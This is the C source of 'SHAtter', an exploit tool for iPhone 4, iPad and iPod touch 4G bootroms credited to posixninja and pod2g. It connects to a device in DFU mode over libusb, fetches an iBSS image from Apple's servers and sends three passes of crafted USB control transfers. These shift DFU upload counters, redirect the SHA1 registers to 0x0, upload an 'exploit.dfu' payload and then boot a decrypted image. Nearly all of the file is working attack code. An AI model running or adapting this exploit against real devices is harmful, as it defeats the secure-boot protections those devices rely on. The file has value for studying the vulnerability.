// SHAtter
//
// vulnerability     by posixninja 07/05/2010
// exploit & payload by pod2g      07/09/2010
//
// thanks to chronicdev team and iphonedev team

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <partial.h>
#include <libusb-1.0/libusb.h>

#define VENDOR_ID    0x05AC
#define NORM_MODE    0x1290
#define RECV_MODE    0x1281
#define WTF_MODE     0x1227
#define DFU_MODE     0x1222
#define BUF_SIZE     0x10000

#define CPID_UNKNOWN        -1
#define CPID_IPHONE2G     8900
#define CPID_IPOD1G       8900
#define CPID_IPHONE3G     8900
#define CPID_IPOD2G       8720
#define CPID_IPHONE3GS    8920
#define CPID_IPOD3G       8922
#define CPID_IPAD1G       8930
#define CPID_IPHONE4      8930
#define CPID_IPOD4G       8930

#define BDID_UNKNOWN        -1
#define BDID_IPHONE2G        0
#define BDID_IPOD1G          2
#define BDID_IPHONE3G        4
#define BDID_IPOD2G          0
#define BDID_IPHONE3GS       0
#define BDID_IPOD3G          2
#define BDID_IPAD1G          2
#define BDID_IPHONE4         0
#define BDID_IPOD4G          8

#define DEVICE_UNKNOWN      -1
#define DEVICE_IPHONE2G      0
#define DEVICE_IPOD1G        1
#define DEVICE_IPHONE3G      2
#define DEVICE_IPOD2G        3
#define DEVICE_IPHONE3GS     4
#define DEVICE_IPOD3G        5
#define DEVICE_IPAD1G        6
#define DEVICE_IPHONE4       7
#define DEVICE_IPOD4G        8

struct device_t {
	int index;
	const char* product;
	const char* model;
	uint32_t board_id;
	uint32_t chip_id;
	const char* url;
};

static struct device_t devices[] = {
	{  0, "iPhone1,1", "m68ap",  0,  8900,
	NULL },
	{  1, "iPod1,1",   "n45ap",  2,  8900,
	NULL },
	{  2, "iPhone1,2", "n82ap",  4,  8900,
	NULL },
	{  3, "iPod2,1",   "n72ap",  0,  8720,
	NULL },
	{  4, "iPhone2,1", "n88ap",  0,  8920,
	NULL },
	{  5, "iPod3,1",   "n18ap",  2,  8922,
	NULL },
	{  6, "iPad1,1",   "k48ap",  2,  8930,
	"http://appldnld.apple.com/iPad/061-8801.20100811.CvfR5/iPad1,1_3.2.2_7B500_Restore.ipsw" },
	{  7, "iPhone3,1", "n90ap",  0,  8930,
	"http://appldnld.apple.com/iPhone4/061-7939.20100908.Lcyg3/iPhone3,1_4.1_8B117_Restore.ipsw" },
	{  8, "iPod4,1",   "n81ap",  8,  8930,
	"http://appldnld.apple.com/iPhone4/061-8490.20100901.hyjtR/iPod4,1_4.1_8B117_Restore.ipsw" },
	{ -1,  NULL,        NULL,   -1,    -1,
	NULL }
};

static unsigned char serial[0x100];

struct libusb_device_handle *usb_init(struct libusb_context* context, int devid) {
	struct libusb_device **device_list;
	struct libusb_device_handle *handle = NULL;

	int deviceCount = libusb_get_device_list(context, &device_list);

	int i;
	for (i = 0; i < deviceCount; i++) {
		struct libusb_device* device = device_list[i];
		struct libusb_device_descriptor desc;
		libusb_get_device_descriptor(device, &desc);	
		if (desc.idVendor == VENDOR_ID && desc.idProduct == devid) {
			libusb_open(device, &handle);
			memset(serial, '\0', 0x100);
			libusb_get_string_descriptor_ascii(handle, desc.iSerialNumber, serial, 0x100);
			break;
		}
	}
	
	libusb_free_device_list(device_list, 1);

	return handle;
}

void usb_close(struct libusb_device_handle *handle) {
	if (handle != NULL) {
		libusb_close(handle);
	}
}

void usb_deinit() {
	libusb_exit(NULL);
}

void get_status(struct libusb_device_handle *handle) {
	unsigned char status[6];
	int ret, i;
	ret = libusb_control_transfer(handle, 0xA1, 3, 0, 0, status, 6, 100);
}

unsigned int get_cpid() {
	unsigned int cpid = 0;

	char* cpid_string = strstr(serial, "CPID:");
	if (cpid_string == NULL) {
		return -1;
	}
	sscanf(cpid_string, "CPID:%d", &cpid);
	return cpid;
}

unsigned int get_bdid() {
	unsigned int bdid = 0;

	char* bdid_string = strstr(serial, "BDID:");
	if (bdid_string == NULL) {
		return -1;
	}
	sscanf(bdid_string, "BDID:%d", &bdid);
	return bdid;
}

struct device_t* check_device() {
	int device = DEVICE_UNKNOWN;
	unsigned int bdid = get_bdid();
	unsigned int cpid = get_cpid();

	switch (cpid) {
	case CPID_IPHONE2G:
		// iPhone1,1 iPhone1,2 and iPod1,1 all share the same ChipID
		//   so we need to check the BoardID
		switch (bdid) {
		case BDID_IPHONE2G:
			device = DEVICE_IPHONE2G;
			break;

		case BDID_IPHONE3G:
			device = DEVICE_IPHONE3G;
			break;

		case BDID_IPOD1G:
			device = DEVICE_IPOD1G;
			break;

		default:
			device = DEVICE_UNKNOWN;
			break;
		}
		break;

	case CPID_IPHONE3GS:
		device = DEVICE_IPHONE3GS;
		break;

	case CPID_IPOD2G:
		device = DEVICE_IPOD2G;
		break;

	case CPID_IPOD3G:
		device = DEVICE_IPOD3G;
		break;

	case CPID_IPAD1G:
		// iPhone3,1 iPad4,1 and iPad1,1 all share the same ChipID
                //   so we need to check the BoardID
                switch (bdid) {
                case BDID_IPAD1G:
                        device = DEVICE_IPAD1G;
                        break;

                case BDID_IPHONE4:
                        device = DEVICE_IPHONE4;
                        break;

                case BDID_IPOD4G:
                        device = DEVICE_IPOD4G;
                        break;
                
		default:
                        device = DEVICE_UNKNOWN;
                        break;
                }
                break;

	default:
		device = DEVICE_UNKNOWN;
		break;
	}

	return &devices[device];
}

void dfu_notify_upload_finished(struct libusb_device_handle *handle) {
	int ret, i;
	ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, 0, 0, 100);
	for (i=0; i<3; i++){
		get_status(handle);
	}
	libusb_reset_device(handle);
}

struct libusb_device_handle* usb_wait_device_connection(struct libusb_context* context, struct libusb_device_handle *handle) {
        sleep(2);
        usb_close(handle);
        handle = usb_init(context, WTF_MODE);
}

int readfile(char *filename, char* buffer, unsigned int skip) {
        FILE* file = fopen(filename, "rb");
        if (file == NULL) {
                printf("File %s not found.\n", filename);
                return 1;
        }
        fseek(file, 0, SEEK_END);
        int len = ftell(file);
        fseek(file, skip, SEEK_SET);
        fread(buffer, 1, len - skip, file);
        fclose(file);

	return len-skip;
}

int main(int argc, char* argv[]) {
	struct libusb_context* context;
	libusb_init(&context);
	libusb_set_debug(NULL, 3);
	struct libusb_device_handle *handle = NULL;
	int mode;

	printf("______________________SHAtter______________________\n\n");
	printf("vuln. 			posixninja	07/05/2010\n");
	printf("exploit & payload	pod2g		07/09/2010\n");
	printf("thanks to all members of chronicdev team and iphonedev team\n");
	printf("__________________________________________________\n\n");

	handle = usb_init(context, WTF_MODE);
	if (handle == NULL) {
		handle = usb_init(context, RECV_MODE);
		if (handle != NULL) {
			mode = RECV_MODE;
		} else {
			handle = usb_init(context, 0x1293);
			if (handle != NULL) {
				mode = 0x1293;
			}

		}
	} else {
		mode = WTF_MODE;
	}

	if (handle == NULL) {
		printf("[X] No 4th gen iDevice found.\n");
		return 1;
	}

	if (mode != WTF_MODE) {
		printf("[X] Please connect your 4th gen iDevice in _DFU_ mode.\n");
		return 1;
	}

	int i, ret;
	unsigned int bdid,cpid;
	unsigned char status[6];
	unsigned char data[0x800];

	cpid = get_cpid(handle);
	bdid = get_bdid(handle);
	if(cpid != 8930) {
		printf("This device is not support at this time\n");
		return -1;
	}

	// discover the device type
	struct device_t* device = check_device();
	if (device == NULL || device->index == DEVICE_UNKNOWN) {
		printf("Unknown device\n");
		return -1;
	}
	printf("Identified device as %s\n", device->product);

	char* ibss = malloc(0x100);
	snprintf(ibss, 0x100, "iBSS.%s.RELEASE.dfu", device->model);

	char* ibss_path = malloc(0x200);
	snprintf(ibss_path, 0x200, "Firmware/dfu/%s", ibss);

	printf("Downloading iBSS from Apple's servers\n");
	if(download_file_from_zip(device->url, ibss_path, "image.bin") != 0) {
		printf("Unable to download iBSS from firmware\n");
		free(ibss_path);
		free(ibss);
		return -1;
	}
	free(ibss);
	free(ibss_path);

	{
		unsigned int addr = 0x84000000, dwn_addr = 0x84000000;
		unsigned int shift = 0x80;
		unsigned int addr_final;
		char buf[0x2C000];
		memset(buf, 0, 0x2C000);

		printf("[.] _PASS_1_\n");
		printf("[.] preparing oversize...\n");
		ret=libusb_control_transfer(handle, 0x21, 4, 0, 0, 0, 0, 100);
		if (ret < 0) {
			printf("[X] failed to reset USB counters.\n");
			return 1;
		}

		ret = libusb_control_transfer(handle, 0xA1, 2, 0, 0, data, shift, 100);
		if (ret < 0) {
			printf("[X] failed to shift DFU_UPLOAD counter.\n");
			return 1;
		}
		addr += shift;
		libusb_reset_device(handle);

		printf("[.] resetting DFU.\n");
		dfu_notify_upload_finished(handle);
		handle = usb_wait_device_connection(context, handle);
		if (!handle) {
			printf("[X] device stalled.\n");
			return 1;
		}

		char* pbuf = buf;
	        do {
	                ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, pbuf, 0x800, 100);
	                dwn_addr += 0x800;
	                pbuf += 0x800;
	        } while (dwn_addr < 0x8402C000 && ret>=0);
		if (ret < 0) {
			printf("[X] failed to upload exploit data.\n");
			return 1;
		}

		addr_final = addr + 0x2C000;
		do {
			ret = libusb_control_transfer(handle, 0xA1, 2, 0, 0, data, 0x800, 100);
			addr += 0x800;
		} while (addr < addr_final && ret>=0);
		if (ret < 0) {
			printf("[X] failed to shift DFU_UPLOAD counter.\n");
			return 1;
		}
		
		printf("[.] SHA1 registers pointed to 0x0.\n");
	}
	
	handle = usb_wait_device_connection(context, handle);
	if (!handle) {
		printf("[X] device stalled.\n");
		return 1;
	}

	{
		unsigned int addr = 0x84000000, dwn_addr = 0x84000000;
		unsigned int shift = 0x140;
		unsigned int addr_final;
		char buf[0x2C000];
		memset(buf, 0, 0x2C000);
		
		printf("[.] _PASS_2_\n");
		printf("[.] preparing oversize...\n");
		ret=libusb_control_transfer(handle, 0x21, 4, 0, 0, 0, 0, 100);
		if (ret < 0) {
			printf("[X] failed to reset USB counters.\n");
			return 1;
		}

		ret = libusb_control_transfer(handle, 0xA1, 2, 0, 0, data, shift, 100);
		if (ret < 0) {
			printf("[X] failed to shift DFU_UPLOAD counter.\n");
			return 1;
		}
		addr += shift;
		libusb_reset_device(handle);
		
		printf("[.] resetting DFU.\n");
		dfu_notify_upload_finished(handle);
		handle = usb_wait_device_connection(context, handle);
		if (!handle) {
			printf("[X] device stalled.\n");
			return 1;
		}

		printf("[.] now uploading exploit.\n");
		readfile("exploit.dfu", buf, 0x0);

		char* pbuf = buf;
        	do {
			ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, pbuf, 0x800, 100);
	                dwn_addr += 0x800;
        	        pbuf += 0x800;
	        } while (dwn_addr < 0x8402C000 && ret>=0);
		if (ret < 0) {
			printf("[X] failed to upload exploit data.");
			return 1;
		}

		addr_final = addr + 0x2C000;
		do {
			ret = libusb_control_transfer(handle, 0xA1, 2, 0, 0, data, 0x800, 100);
			addr += 0x800;
		} while (addr < addr_final && ret>=0);
		if (ret < 0) {
			printf("[X] failed to shift DFU_UPLOAD counter.");
			return 1;
		}
		
		printf("[.] exploit sent.\n");
	}

	handle = usb_wait_device_connection(context, handle);
	if (!handle) {
		printf("[X] device stalled.\n");
		return 1;
	}

	{
		unsigned int addr_final;
		char buf[0x2C000];
		memset(buf, 0, 0x2C000);

		printf("[.] _PASS_3_\n");
		ret=libusb_control_transfer(handle, 0x21, 4, 0, 0, 0, 0, 100);
		if (ret < 0) {
			printf("[X] failed to reset USB counters.\n");
			return 1;
		}

		printf("[.] now uploading decrypted image.\n");
		int len = readfile("image.bin", buf, 0x0);

		char* pbuf = buf;
        	do {
			ret = libusb_control_transfer(handle, 0x21, 1, 0, 0, pbuf, 0x800, 100);
			pbuf += 0x800;
			len -= 0x800;
	        } while (len > 0 && ret>=0);

		if (ret < 0) {
			printf("[X] failed to upload image.");
			return 1;
		}

		dfu_notify_upload_finished(handle);
		libusb_reset_device(handle);

		printf("[.] done. Have fun !\n");
	}

	usb_close(handle);
	usb_deinit();
	
	return 0;
}
